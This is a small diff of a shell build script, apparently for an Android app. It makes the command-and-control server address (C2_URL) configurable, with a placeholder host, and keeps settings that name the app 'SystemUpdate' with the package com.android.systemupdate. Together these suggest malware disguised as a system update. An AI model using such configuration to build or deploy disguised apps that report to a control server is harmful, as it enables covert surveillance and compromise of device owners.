@@ -5,7 +5,7 @@
 
 set -e
 
-C2_URL="http://192.168.1.72:8080"
+C2_URL="${C2_URL:-https://c2.example.com:443}"
 APP_NAME="SystemUpdate"
 PKG="com.android.systemupdate"
 SDK="$HOME/Library/Android/sdk"
